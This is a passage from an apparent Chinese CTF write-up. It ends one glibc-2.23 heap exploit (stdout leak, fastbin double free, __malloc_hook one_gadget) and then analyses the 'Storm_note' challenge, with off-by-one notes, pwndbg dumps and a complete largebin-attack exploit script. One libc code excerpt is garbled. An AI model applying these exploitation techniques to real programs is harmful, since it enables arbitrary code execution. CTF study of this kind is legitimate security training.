    create(0x60,'\x00')#6
    edit(3,'\xdd\x45')
    create(0x60,'A')
    payload = 'A'*0x33 + p64(0xfbad1800) + p64(0x7f734fa446a3)*3
    payload += '\x50'
    create(0x65,payload)
    p.sendline()
    libc_base = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = libc_base - 3954339
    print hex(libc_base)
    malloc_addr = libc_base + libc.symbols['__malloc_hook']
    one_gadget_addr = libc_base + 0xf02a4
    log.success('malloc_addr :'+hex(malloc_addr))
    log.success('one_addr :'+hex(one_gadget_addr))
    delete(2)
    delete(1)
    delete(2)
    create(0x60,p64(malloc_addr-35))
    create(0x60,'A')
    create(0x60,p64(malloc_addr-35))
    create(0x60,'\x00'*19+p64(one_gadget_addr))
    #gdb.attach(p)
    p.sendlineafter('>','1')
    p.sendlineafter('>',str(0x10))
    p.interactive()
## Storm_note：
这道题其实是一道改编`0ctf`的一道`heapstormII`的题目，其实基本一样，就是阉割了一点，难度降低了一点。
### 漏洞点：
OFF-BY-ONE：
    if ( v1 >= 0 && v1 fd_nextsize = fwd;
    victim->bk_nextsize = fwd->bk_nextsize;
    fwd->bk_nextsize = victim;
    victim->bk_nextsize->fd_nextsize = victim;
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
第一个chunk构造（fwd）：
    pwndbg> x/10xg 0x000055740eab36d0
    0x55740eab36d0: 0x0000000000000000  0x0000000000000611
    0x55740eab36e0: 0x0000000000000000  0x00000000abcd00e8
    0x55740eab36f0: 0x0000000000000000  0x00000000abcd00c3
    0x55740eab3700: 0x0000000000000000  0x0000000000000000
    0x55740eab3710: 0x0000000000000000  0x0000000000000000
第二个chunk构造（victim）：
    pwndbg> x/10xg 0x000055740eab3040
    0x55740eab3040: 0x0000000000000000  0x0000000000000621
    0x55740eab3050: 0x0000000000000000  0x00000000abcd00e0
    0x55740eab3060: 0x0000000000000000  0x0000000000000000
    0x55740eab3070: 0x0000000000000000  0x0000000000000000
    0x55740eab3080: 0x0000000000000000  0x0000000000000000
发生链表操作后，第一个chunk：
    pwndbg> x/10xg 0x0000562493c6d6d0
    0x562493c6d6d0: 0x0000000000000000  0x0000000000000611
    0x562493c6d6e0: 0x0000000000000000  0x0000562493c6d040
    0x562493c6d6f0: 0x0000000000000000  0x0000562493c6d040
    0x562493c6d700: 0x0000000000000000  0x0000000000000000
    0x562493c6d710: 0x0000000000000000  0x0000000000000000
第二个chunk：
    pwndbg> x/10xg 0x0000562493c6d040
    0x562493c6d040: 0x0000000000000000  0x0000000000000621
    0x562493c6d050: 0x00007f6959dd4b78  0x00000000abcd00e8
    0x562493c6d060: 0x0000562493c6d6d0  0x00000000abcd00c3
    0x562493c6d070: 0x0000000000000000  0x0000000000000000
    0x562493c6d080: 0x0000000000000000  0x0000000000000000
我根据代码操作后，发现第二个chunk发生链表后的fd和bk指针改变的和我操作的不一致，根据代码`victim->fd =
fwd;`他的fd指针应该是`0x0000562493c6d6d0`，但是不是，而是`main_area`地址，bk指针也同样不一致。
还有mmap区域的chunk：
    pwndbg> x/10xg 0xabcd00e0
    0xabcd00e0: 0x2493c6d040000000  0x0000000000000056
    0xabcd00f0: 0x00007f6959dd4b78  0x0000562493c6d040
    0xabcd0100: 0x01627aa51d72b4f5  0x716640eeb63e737c
    0xabcd0110: 0x97f5a8e005bc15e5  0x8854b65bb145df49
    0xabcd0120: 0x8761c55ca19c7998  0xda55ad2af9da7c5f
在`0xabcd00f0 - 8`区域为什么会有`main_area`和`victim chunk`的指针的？
### EXP：
    from pwn import *
    p = process('./Storm_note')
    #p = remote('ctf1.linkedbyx.com',10476)
    elf = ELF('./Storm_note')
    libc = ELF('./libc-2.23.so')
    #max_fast = 
    def create(size):
        p.sendlineafter('Choice: ','1')
        p.sendlineafter('size ?\n',str(size))
    def edit(index,content):
        p.sendlineafter('Choice: ','2')
        p.sendlineafter('Index ?\n',str(index))
        p.sendafter('Content: \n',content)
    def delete(index):
        p.sendlineafter('Choice: ','3')
        p.sendlineafter('Index ?\n',str(index))
    def getshell():
        p.sendlineafter('Choice: ','666')
        p.sendlineafter('If you can open the lock, I will let you in','A'*0x30)
    create(0x28)  #0
    create(0x528) #1
    create(0xf8)  #2
    create(0x28)  #3
    create(0x28)  #4
    create(0x518) #5
    create(0xf8)  #6
    create(0x28)  #7
    delete(0)
    edit(1,'A'*0x520+p64(0x560))
    delete(2)
    create(0x38) #0
    create(0x610)#2
    delete(4)
    edit(5,'A'*0x510+p64(0x550))
    delete(6)
    create(0x38) #4
    create(0x600)#6
    delete(6)
    delete(2)
    create(0x610)#2
    edit(5,p64(0)+p64(0x611)+p64(0)+p64(0xABCD0100-0x20+8)+p64(0)+p64(0xABCD0100-0x38-5))
    delete(2)
    edit(1,p64(0)+p64(0x621)+p64(0)+p64(0xABCD0100-0x20))
    create(0x48)#2
    gdb.attach(p)
    edit(2,p64(0)*2+'A'*0x30)
    getshell()
    p.interactive()